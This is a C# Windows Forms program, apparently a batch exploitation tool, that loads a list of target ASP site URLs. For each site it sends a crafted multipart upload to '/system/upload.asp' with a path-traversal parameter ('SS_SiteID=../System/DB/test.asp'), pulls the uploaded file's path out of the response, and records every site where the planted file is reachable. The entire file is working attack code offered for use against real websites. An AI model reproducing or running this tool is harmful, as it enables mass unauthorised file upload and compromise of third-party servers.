using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Net;
namespace Csharp批量漏洞
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        List<string> sl = new List<string>();
        public string path = "";
        private void btnOpen_Click(object sender, EventArgs e)
        {
            OpenFileDialog opf = new OpenFileDialog();
            if (opf.ShowDialog()==DialogResult.OK) {
                path = opf.FileName;
                txtpath.Text = path;
                FileStream fs = File.OpenRead(path);
                StreamReader sr = new StreamReader(fs,Encoding.Default);
                string temp = "";
                while (!sr.EndOfStream)
                {
                    temp = sr.ReadLine();
                    Regex re = new Regex(@"(http://.*.asp)");
                    sl.Add(re.Match(temp).Value);
                }
                urlist.DataSource = sl;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(new ParameterizedThreadStart(test));
            t.IsBackground = true;
            t.Start(sl);
        }

        public delegate void setVal(object o);

        void setTxt(object o) {
            string re = o.ToString();
            this.txtResult.Text +=re+"\r\n";
        }
        public void test(object oli) {
            List<string> urlist = (List<string>)oli;
            for (int i=0;i<urlist.Count;i++) {
               string re=  test(urlist[i]);
                try
                {
                    Regex reg = new Regex(@"(?<add>http://.*?)/system/upload.asp");
                    string url2 = reg.Match(urlist[i]).Groups["add"].Value+re;
                    HttpWebRequest re2 = (HttpWebRequest)WebRequest.Create(url2);
                    re2.Method = "GET";
                    WebProxy proxy = new WebProxy();                                      
                    proxy.Address = new Uri("http://127.0.0.1:8080");
                   // re2.Proxy = proxy;
                    HttpWebResponse rp2 = (HttpWebResponse)re2.GetResponse();
                    int stat = (int)rp2.StatusCode;
                    if (stat == 200)
                    {
                        string res = url2;
                        if (txtResult.InvokeRequired)
                        {
                            setVal st = new setVal(setTxt);
                            txtResult.Invoke(st, res);
                        }
                        else
                        {
                            txtResult.Text = res;
                        }
                    }
                   
                }
                catch (Exception ex)
                {
                    continue;  
                }
                
            }


            MessageBox.Show("批完了");
        }

        public string test(string url) {
            string address = url + "?action=save&type=&style=standard&SS_SiteID=../System/DB/test.asp";
            int returnValue = 0;
            string fileNamePath = "1.jpg";
            // 要上传的文件
            FileStream fs = new FileStream(fileNamePath, FileMode.Open, FileAccess.Read);
            BinaryReader r = new BinaryReader(fs);
            //时间戳
            string strBoundary = "----------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + strBoundary + "\r\n");
            //请求头部信息
            StringBuilder sb = new StringBuilder();
            sb.Append("--");
            sb.Append(strBoundary);
            sb.Append("\r\n");
            sb.Append("Content-Disposition: form-data; name=\"uploadfile\"; filename=\"bg.jpg\"");
            sb.Append("\r\n");
            sb.Append("Content-Type: ");
            sb.Append("image/jpeg");
            sb.Append("\r\n");
            sb.Append("\r\n");
            string strPostHeader = sb.ToString();
            string sReturnString="";
            byte[] postHeaderBytes = Encoding.UTF8.GetBytes(strPostHeader);
            // 根据uri创建HttpWebRequest对象
            HttpWebRequest httpReq = (HttpWebRequest)WebRequest.Create(new Uri(address));
            WebProxy proxy = new WebProxy();                                      //定義一個網關對象
            proxy.Address = new Uri("http://127.0.0.1:8080");
           // httpReq.Proxy = proxy;
            httpReq.Method = "POST";
            //对发送的数据不使用缓存
            httpReq.AllowWriteStreamBuffering = false;
            //设置获得响应的超时时间（300秒）
            httpReq.Timeout = 300000;
            httpReq.ContentType = "multipart/form-data; boundary=" + strBoundary;
            long length = fs.Length + postHeaderBytes.Length + boundaryBytes.Length;
            long fileLength = fs.Length;
            httpReq.ContentLength = length;
            try
            {
                
                //每次上传4k
                int bufferLength = 4096;
                byte[] buffer = new byte[bufferLength];
                //已上传的字节数
                long offset = 0;
                //开始上传时间
                DateTime startTime = DateTime.Now;
                int size = r.Read(buffer, 0, bufferLength);
                Stream postStream = httpReq.GetRequestStream();
                //发送请求头部消息
                postStream.Write(postHeaderBytes, 0, postHeaderBytes.Length);
                while (size > 0)
                {
                    postStream.Write(buffer, 0, size);
                    offset += size;
                    TimeSpan span = DateTime.Now - startTime;
                    double second = span.TotalSeconds;
                    Application.DoEvents();
                    size = r.Read(buffer, 0, bufferLength);
                }
                //添加尾部的时间戳
                postStream.Write(boundaryBytes, 0, boundaryBytes.Length);
                postStream.Close();
                //获取服务器端的响应
                WebResponse webRespon = httpReq.GetResponse();
                Stream s = webRespon.GetResponseStream();
                StreamReader sr = new StreamReader(s);
                //读取服务器端返回的消息
                 sReturnString = sr.ReadToEnd();

                Regex re = new Regex(@"(/UploadFile/.*?.jpg)");

                sReturnString= re.Match(sReturnString).Value;
                s.Close();
                sr.Close();
            }
            catch
            {
                returnValue = 0;
            }
            finally
            {
                fs.Close();
                r.Close();
            }
            
            return sReturnString;
        } 


    }
}
